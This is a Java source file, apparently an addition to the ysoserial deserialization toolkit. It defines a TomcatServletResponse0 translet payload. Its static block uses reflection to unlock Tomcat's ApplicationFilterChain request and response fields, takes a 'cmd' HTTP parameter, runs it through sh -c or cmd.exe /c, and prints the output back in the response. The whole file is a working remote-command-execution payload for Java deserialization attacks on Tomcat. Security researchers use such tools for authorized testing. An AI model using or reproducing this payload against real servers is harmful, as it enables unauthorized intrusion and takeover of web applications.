package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

public class TomcatServletResponse0 extends AbstractTranslet {
    static {
        try {
            System.out.println("TomcatServletResponse0-----------");
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestField = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedResponse");
//            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
//            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);

            ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);
            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
            boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
            if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
                lastServicedRequestField.set(null, new ThreadLocal<>());
                lastServicedResponseField.set(null, new ThreadLocal<>());
                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
            }

            if (WRAP_SAME_OBJECT && lastServicedResponse != null && lastServicedRequest != null) {
                String cmd = lastServicedRequest.get().getParameter("cmd");
                if (cmd != null) {
                    ServletResponse servletResponse1 = lastServicedResponse.get();
                    PrintWriter printWriter = servletResponse1.getWriter();
                    printWriter.println("success");

                    boolean isLinux = true;
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in, "GBK"));//控制台正常
                    String line = null;
                    while ((line = bufferedReader.readLine()) != null) {
                        printWriter.print(line + "<br>");
                    }

                    System.out.println("over");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
